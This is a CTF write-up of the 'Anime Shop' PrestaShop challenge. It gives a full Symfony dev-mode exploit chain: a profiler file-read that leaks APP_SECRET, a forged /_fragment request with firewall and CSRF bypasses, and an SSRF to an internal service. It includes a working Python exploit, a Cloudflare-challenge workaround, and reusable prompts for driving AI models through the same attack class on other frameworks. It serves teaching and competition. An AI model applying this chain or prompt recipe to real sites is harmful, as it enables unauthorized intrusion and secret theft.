---
title: "Anime Shop"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: web
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, web, ai-assisted]
draft: false
summary: "PrestaShop deployed from its GitHub source tree leaves dev mode ON, chaining an unauth Symfony profiler file-read to an APP_SECRET-signed /_fragment SSRF that reflects an internal-only flag."
icon: "🛍️"
---

## Summary

Anime Shop is a PrestaShop 9.1.4 storefront deployed straight from the GitHub *source* tree instead of a hardened release, which silently leaves `_PS_MODE_DEV_ = true`. That single mistake unlocks a full chain: an unauthenticated Symfony Web Profiler gives arbitrary file-read to leak `APP_SECRET`, the secret lets you forge a signed `/_fragment` request, and request-attribute injection through `_path` bypasses PrestaShop's admin firewall and CSRF listener to invoke `Tools::file_get_contents('http://internal:5000/admin')` server-side. The flag lives only on an internal Docker-network service, so the dev-mode exception page that reflects the controller's return value *is* the exfil channel.

This is a writeup about how I drove an LLM through that chain. I want to be honest about the division of labor: the model did almost all of the grinding — reading the PrestaShop source, finding the exact listener conditions, reconstructing the `UriSigner` HMAC, writing the script. My job was recognizing the challenge class from the hint, feeding it the right artifacts, killing the wrong rabbit holes it kept wandering into, and verifying every claim before I trusted it. The interesting content here is the *steering*, so I've kept a "Lessons learned" section at the end that is more concrete than the usual hand-wave.

## Solution

### Reading the room before reading the code

The challenge text is the whole thesis: *"Bro quit **vcs** to open an Anime Shop, can you break it?"* That word "vcs" is doing a lot of work. It is both a callback (the author left their previous gig) and the literal vulnerability: the shop was deployed from **version control** — the raw GitHub source — rather than from a packaged release. I clocked that immediately and it became the hypothesis I steered the model toward, because the difference between PrestaShop's source tree and its release package is exactly *dev mode*.

I set the model up with that framing rather than letting it brute-force around:

> "This is PrestaShop. The challenge hint is 'quit VCS to open a shop' — I think it means the app was deployed from the GitHub source tree, not a release package. In the source tree, what does `config/defines.inc.php` set `_PS_MODE_DEV_` to, and what does dev mode expose in the Symfony admin app? List concrete attack surface."

That prompt did two things at once: it gave the model the *theory of the case* (source-tree deploy → dev mode), and it asked for **concrete attack surface** rather than a lecture. The answer came back clean: the source-tree `defines.inc.php` leaves dev mode on, and dev mode turns on the Web Profiler, verbose exception pages, and the `/_fragment` endpoint. Three primitives, and they compose.

### Architecture: where the flag actually is

The compose file ships four services:

| Service | Role |
|---|---|
| `app` | PrestaShop 9.1.4 (Ubuntu 24.04, Apache + PHP 8.3), publicly exposed |
| `db` | MariaDB 10.11 |
| `internal` | tiny Node HTTP service holding the **FLAG**, Docker-network only |
| `bot` | Puppeteer/Firefox "report" bot that logs in as a *customer* and visits a submitted path |

The flag handler in `internal/server.js` is blunt:

```js
if (url.pathname === '/admin') {
  writeRaw(res, 200, process.env.FLAG || 'v1t{dummy_dummy}');
  return;
}
```

So the flag is at `http://internal:5000/admin`, and `internal` is only reachable from *inside* the Docker network — from `app` or `bot`. That constraint is the spine of the whole challenge: whatever I do, the final read has to happen server-side. No amount of client-side cleverness reaches `internal` from my laptop.

### Dead-end #1: the report bot is a trap (and I had to stop the model chasing it)

This is the first place the model wanted to be helpful in the wrong direction. A "report" bot that logs in and visits a path *screams* XSS to any model trained on CTF writeups, and it immediately drafted an XSS-to-`fetch` exfil plan. I made it test the assumption instead of acting on it:

> "Before we write any XSS, check feasibility: the bot is a browser on the `app` origin. The flag is on `internal:5000` with NO CORS headers. Can a page on the `app` origin read `http://internal:5000/admin` cross-origin? Reason through CORS modes (`cors`, `no-cors`, opaque responses) and tell me if exfil is even possible."

Forcing that reasoning produced the right conclusion: the flag service sets **no CORS headers**, so a browser on the `app` origin can fetch but never *read* the cross-origin body. I confirmed it empirically by hosting a probe on the app origin and submitting it to the bot — every mode fails:

```
cors_err  = NetworkError when attempting to fetch resource.   (blocked)
nocors    = len0                                              (opaque, unreadable)
scripterr = Script error.                                     (sanitized)
```

The customer bot is a red herring relative to the intended path. The flag must be read **from `app`, server-side**. Killing this branch early saved a lot of wasted effort — the model would happily have spent the whole session perfecting an XSS that physically cannot exfiltrate.

### The dev-mode foothold: an unauthenticated profiler

PrestaShop mounts its Symfony admin under `/admin-dev`, and the admin firewall *intentionally* leaves the profiler unauthenticated — that's normal for dev, catastrophic in prod:

```yaml
# app/config/admin/security.yml
firewalls:
  - pattern: ^/(_(profiler|wdt)|css|images|js)/
    security: false
```

The tell is that every admin response carries a profiler token header. Hit the login page, grab the token, open the profiler — no auth required:

```
GET /admin-dev/login          -> X-Debug-Token-Link: /admin-dev/_profiler/<token>
GET /admin-dev/_profiler/<t>  -> 200 (no auth)
```

I verified dev mode was genuinely on (not just my theory) by reading the profiler's own config panel, which showed `use_debug_toolbar => true`. That confirmation mattered: the entire rest of the chain is predicated on dev mode, so I wanted a positive signal, not an inference, before investing in `/_fragment`.

### Step 1 — profiler `open` action → arbitrary file read → `APP_SECRET`

The Web Profiler ships an "open file" route used by the toolbar to jump to source in your editor. It reads any file under the project directory. It does block `..` traversal and dotfiles, but `app/config/parameters.php` is a perfectly ordinary in-tree path — and that's where PrestaShop stores its secrets:

```
GET /admin-dev/_profiler/open?file=app/config/parameters.php&line=1
```

The response is highlighted source HTML; strip the markup and you have the parameters:

```
secret            = vd8mcadGNTayxaCpqWpryTm0fpK08EizUMsCLrM555iiBXZufdOwMD79ioYTFAQH
cookie_key        = 0RMNEAJVwySnFrCIV83Osz5V0dii47SxkpKO8You3MVoa1T3GJ5cQXKBLhVQXsV4
database_password = change_db_password_7f3b1c9e
```

The DB password is a decoy — it was rotated and `db` isn't externally reachable anyway. The prize is `secret`, the Symfony `APP_SECRET`. Everything downstream is signed with it.

### Step 2 — `APP_SECRET` → a signed `/_fragment` call

Symfony's `FragmentListener` renders an arbitrary controller via `/_fragment?_path=…`, but the request must carry a valid `_hash` — an HMAC-SHA256 of the full request URI keyed by `APP_SECRET`, computed by `UriSigner`. Now that I have the secret, I can sign anything I want.

The crucial detail — and the thing the model needed to be pointed at — is *how `_path` is parsed*. Symfony runs it through `parse_str()`, and the resulting keys are **merged into the request attributes**. That merge is the lever: it lets me inject the *internal* attributes that PrestaShop's security listeners inspect. So `_path` isn't just "pick a controller," it's "pick a controller *and* forge the request attributes that gate it."

PrestaShop wraps the Symfony admin in two protective listeners. I have to defeat both, and `_path` injection defeats both.

**Bypass A — the admin firewall.** The access control in `security.yml` requires authentication *unless* the request is flagged as an anonymous controller:

```yaml
- { path: ^/, roles: IS_AUTHENTICATED,
    allow_if: 'request.attributes.has("_anonymous_controller")
               and request.attributes.get("_anonymous_controller") == true' }
```

This is an ExpressionLanguage expression, and `==` there is a **loose** comparison. The model's first instinct was to inject `_anonymous_controller=true` (a literal boolean), which is wrong — values coming through `parse_str()` are *strings*. I corrected it: inject `_anonymous_controller=1`, the string `"1"`, and let loose typing do the work — `"1" == true` evaluates true, so the request is treated as anonymous. No login.

**Bypass B — the CSRF "compromised" page.** PrestaShop's `TokenizedUrlsListener` redirects any admin URL lacking a valid token to `/admin-dev/security/compromised`, *unless* the route name starts with `_` (or `api_`):

```php
$route = $request->get('_route');
if (str_starts_with($route, '_') || str_starts_with($route, 'api_')) {
    return; // skip the token check
}
```

So I inject `_route=_x` through `_path`. The listener sees a route beginning with `_` and bails out before it can redirect me. (The model initially missed this listener entirely and got a 302 to `/security/compromised`; the redirect itself was the clue that told me to go find a second gate.)

**The gadget.** With both gates open, I point the fragment at a method that takes a URL and returns its contents. PrestaShop's `Tools::file_get_contents` is perfect — Symfony resolves `Tools::file_get_contents` by instantiating `Tools` and calling the method, binding arguments from request attributes *by name*, so an attribute `url=...` is passed straight in:

```
_path = _controller=Tools::file_get_contents
        &url=http://internal:5000/admin
        &_anonymous_controller=1
        &_route=_x
```

Here's the elegant part, and the reason dev mode is load-bearing twice over. `Tools::file_get_contents()` returns a **string**, not a `Response` object. In production Symfony would just 500 with a generic message. In *dev* mode it throws `ControllerDoesNotReturnResponseException` and renders a verbose error page that **embeds the offending return value**:

```
The controller must return a "...\Response" object but it returned
a string ("v1t{...}"). (500 Internal Server Error)
```

So the SSRF response body — the flag fetched from `internal:5000` — gets reflected straight back into my exception page. No XSS, no admin login, no second request. The dev-mode error handler is the exfiltration primitive.

### Two gotchas that cost real time

**The signing scheme: `http://` not `https://`.** The live site sits behind Cloudflare, and the origin has **no trusted proxies configured**. That means the origin sees the connection as plain `http://`, and `UriSigner` signs `$request->getUri()` — the URI *as the origin sees it*. So the HMAC must be computed over `http://animeshop.v1t.site/admin-dev/_fragment?...`, even though I'm connecting over HTTPS. The model defaulted to signing the `https://` URL I was actually hitting and got a `500` (invalid signature) every time. The fix is counterintuitive enough that I had to spell it out: *sign the http scheme, send over https.* Once I did, the signature validated.

**Cloudflare's managed challenge.** Any automated client gets a `403 "Just a moment…"`. I solved this the boring way: pass the challenge once in a real Firefox window, then reuse the `cf_clearance` cookie *with the exact same Firefox User-Agent*. A UA mismatch invalidates the cookie, so the UA and the cookie are a matched pair in the script.

### The end-to-end exploit

One script, challenge data to printed flag. Plug in the leaked secret and a fresh `cf_clearance`:

```python
#!/usr/bin/env python3
import hashlib, hmac, base64, urllib.request, urllib.error, urllib.parse as up, re

HOST   = 'animeshop.v1t.site'
SECRET = 'vd8mcadGNTayxaCpqWpryTm0fpK08EizUMsCLrM555iiBXZufdOwMD79ioYTFAQH'  # from profiler open
CF     = '<cf_clearance from a real browser>'
UA     = 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
PATH   = '/admin-dev/_fragment'

# Request attributes injected via _path (parse_str -> merged into attributes):
#   _controller             -> the gadget (Tools::file_get_contents, returns a string)
#   url                     -> bound to the method arg by name; our internal SSRF target
#   _anonymous_controller=1 -> loose "1" == true bypasses the admin firewall
#   _route=_x               -> route starting with "_" skips the CSRF TokenizedUrlsListener
infos = {
    '_controller': 'Tools::file_get_contents',
    'url': 'http://internal:5000/admin',
    '_anonymous_controller': '1',
    '_route': '_x',
}
qs = '?_path=' + up.quote_plus(up.urlencode(infos))

# Origin has no trusted proxies, so it sees http:// -> UriSigner signs the http URI.
# Sign over http://, but actually connect over https://.
sign_base = f'http://{HOST}{PATH}{qs}'
h = base64.b64encode(hmac.new(SECRET.encode(), sign_base.encode(), hashlib.sha256).digest())
url = f'https://{HOST}{PATH}{qs}&_hash=' + up.quote(h).replace('/', '%2F')

req = urllib.request.Request(url, headers={'User-Agent': UA, 'Cookie': f'cf_clearance={CF}'})
try:
    body = urllib.request.urlopen(req, timeout=20).read().decode('utf-8', 'replace')
except urllib.error.HTTPError as e:
    body = e.read().decode('utf-8', 'replace')  # the 500 page IS the channel

# The dev-mode exception page reflects the returned string (HTML-escaped quotes).
m = re.search(r'it returned a string \(&quot;(.*?)&quot;\)', body)
print('FLAG:', m.group(1) if m else 'not found')
```

```
$ python3 solve.py
FLAG: v1t{twinky_winky_tini_tiny_duck}
```

### The chain, end to end

```
Deployed from VCS source  ─►  _PS_MODE_DEV_ = true
                              │
                              ├─ unauth Symfony Web Profiler (/admin-dev/_profiler)
                              │     └─ open?file=app/config/parameters.php  ─►  APP_SECRET
                              │
                              └─ /_fragment enabled
                                    │  sign with APP_SECRET  (over http://, not https://)
                                    │  _anonymous_controller=1   (loose == bypasses firewall)
                                    │  _route=_x                 (skip CSRF listener)
                                    │  _controller=Tools::file_get_contents
                                    │  url=http://internal:5000/admin
                                    ▼
                              dev exception reflects returned string  ─►  FLAG
```

## Flag

```
v1t{twinky_winky_tini_tiny_duck}
```

## Lessons learned - prompting the AI

Whenever you face a **PHP/Symfony (or Laravel/Rails/Flask) app deployed in debug/dev mode where the win is "leak the signing secret, then forge a request to a debug-only signed endpoint that runs an internal SSRF/file-read"** — this is a *class*, not a one-off. PrestaShop's profiler-leak → `APP_SECRET` → signed `/_fragment` → `Tools::file_get_contents` SSRF is one instance; Laravel `APP_DEBUG`/Ignition, Rails `secret_key_base`/`web-console`, and Flask `/console` PIN are the siblings. The same four prompting moves transfer to every one of them. Below, every prompt is written so you can paste it at the *next* such target with the framework name swapped.

**1. Open by stating the dev-mode hypothesis and demanding the *primitive list*, not prose.** Debug-mode bugs always come in a bundle (verbose exceptions + a file-read panel + a signed render/eval endpoint). Make the model enumerate the whole bundle so you can plan the chain before touching the target:

> "Assume this `<FRAMEWORK>` app is deployed from source / with debug mode ON. List every debug-only primitive that gives me, in order of usefulness: (a) arbitrary file read, (b) the location of the app signing secret / `APP_SECRET` / `secret_key_base` / Flask `SECRET_KEY`, (c) any endpoint that renders or signs an arbitrary controller/template/expression. For each, give the exact route and the source file that registers it. No background prose."

The phrase "exact route and the source file that registers it" is what stops the model summarizing the docs and forces it into the actual security/config files (`security.yml`, `routes`, `defines.inc.php`) where the real conditions live.

**2. Force a feasibility check before any client-side exfil idea.** This class always ships a "report bot," and the model will reflexively write XSS. The flag is on an internal, CORS-less origin, so client-side exfil is usually *physically impossible*. Make it prove that first:

> "There is a report bot (a browser on the app origin) and the target value lives on an internal service with NO CORS headers. Before proposing any XSS/JS: reason through `fetch` modes `cors` / `no-cors` / opaque responses and tell me whether a page on the app origin can ever *read* that cross-origin body. If it cannot, say so and pivot to a server-side read."

When the answer is "cannot read," you've just deleted the single biggest time sink of this class. (If CORS *is* permissive, you've learned that too — same prompt, opposite branch.)

**3. When a gate returns an error, paste the exact status/redirect and demand the *negative* source condition.** The whole exploit is "find each security listener and the input that makes it SKIP." Models guess here; pin them to the code:

> "I injected `<attr>=true` and the firewall still blocks me. Values arrive via `parse_str()` so they are *strings*. Given the framework uses a LOOSE `==` in this expression `<paste the expression>`, what literal string value makes it evaluate true?" → answer: `"1"`.
>
> "I get a `302` to `<path>`. Some listener is redirecting un-tokenized admin requests. Find that listener in the source and quote the EXACT condition under which it returns early WITHOUT redirecting." → answer: a `_route` starting with `_`.
>
> "Signing keeps giving `500 invalid signature`. The origin is behind a CDN with no trusted proxies. What scheme does the signer see in `$request->getUri()` / the request object — the public `https` or the backend `http`?" → answer: sign the `http` URI, send over `https`.

Pasting the literal error and saying "quote the EXACT condition from source" is the single highest-leverage habit for this class — it converts confident hallucination into a verifiable source citation.

**Tell the model to focus on:** (1) the *delta* between the framework's source tree and its shipped release — that delta IS the bug (dev flag default, debug routes mounted, secret in an in-tree file); (2) how the signed endpoint *parses* its payload and whether those keys land in request attributes / controller args by name (that's the injection lever); (3) every admin security listener and its *skip* condition, expressed as concrete attribute values you can inject. **Tell it to AVOID up front:** the report-bot/XSS path (no CORS = no read), any leaked DB/decoy credential (usually rotated and unreachable), assuming HTTPS/strict typing/strict comparison at the origin, and trusting that the signed URL is the one *you* type — it's the one the *backend* reconstructs.

**How to verify the output for this class (catch the hallucinations):** demand a positive signal at every stage, judged by the HTTP status *transition*, never by "this should work."
- Dev mode is real → confirm a debug-only fact came back (e.g. `use_debug_toolbar => true` from the profiler config), not inferred from the hint.
- File read works → confirm the *actual secret string* returned, not a `403`/empty body.
- Each listener bypass → the status transition tells you which gate moved: `302 → security page` means a listener still fires (wrong skip), `500 invalid signature` means wrong signing scheme/URI, and the *specific* `500 ControllerDoesNotReturnResponse` (or framework equivalent that echoes the return value) means success — that exact error is the one carrying your loot. If the model claims success on any other status, it's hallucinating.

**Fast-path prompt recipe for the class:** *"`<FRAMEWORK>` is in debug/dev mode. Enumerate debug-only endpoints (profiler / fragment / Ignition / web-console / Flask console) with their source routes; show where the signing secret lives and read it; then for the signed render endpoint, map its path/payload param to request attributes and list every admin security listener with the EXACT input that makes each one SKIP — I'll inject all the skips at once. Sign with the leaked secret over the scheme the ORIGIN actually sees behind the proxy, point the controller at an internal-only URL, and read the flag out of the verbose dev exception that echoes the return value."*
